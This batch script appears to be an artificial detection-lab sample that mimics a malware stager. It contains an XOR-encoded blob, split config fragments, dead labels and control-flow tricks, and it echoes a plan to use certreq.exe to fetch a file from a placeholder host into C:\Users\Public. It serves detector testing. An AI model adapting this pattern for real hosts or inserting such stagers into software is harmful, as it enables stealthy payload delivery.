@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:split_fragments|reverse_xor
rem HUNTRESS-MATERIAL:R1JXHQcHVQJQAgMBVQseVlRSR0BvUVJ/QEBWQUddRntvUFpfUUZjb0BBVkBmbwlwDltHUkNsVl9aVU9HUlcdAAsCAgJQBFYcV1pfUkVdWh1WX0NeUktWHQcHVQJQAgMBVQscHAlAQ0dHWw5fQUZPBwdVAlACAwFVCx5dVFpSQ15SUA5XWmxdVFpSQ15SUE9WXVxdDlZUUkZUXVJfbEdLVl1PV11cXlJaVw5bQ1JBVE8CDkddRlxQbFZUUkdAT1ZLVh1CVkFHQVZQDkFWR0NSV1JPVl9aVWxWR1pBRB9WR1xeVkFsVkFaRkJQUg5AQ1ZHQE8CDkU=
rem HUNTRESS-EXTENSION:bat
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
set "v_a0=v=1|steps=acquire_remote,write_file|adapter=certreq.exe|stage_"
set "v_a1=count=1|graph=diamond|next_language=none|campaign_id=campaign-"
set "v_a2=8f201c1f44|url=https://8f201c1f44.example.invalid/e7c11183.dat"
set "v_a3=|file_path=C:\Users\Public\HuntressLab\stage-8f201c1f44.dat"
goto :HUNTRESS_SEPARATOR_DONE
ver >nul & rem HUNTRESS separator ampersand
:HUNTRESS_SEPARATOR_DONE
set "neutral_dead_label=668d0c94"
ver >nul
if errorlevel 1 exit /b 1
call set "cfg=%%v_a0%%%%v_a1%%%%v_a2%%%%v_a3%%"
echo(!cfg!
exit /b 0
:HUNTRESS_UNUSED
goto :HUNTRESS_PLAN
:HUNTRESS_PLAN
echo certreq.exe acquire https://8f201c1f44.example.invalid/e7c11183.dat to C:\Users\Public\HuntressLab\stage-8f201c1f44.dat
exit /b 0
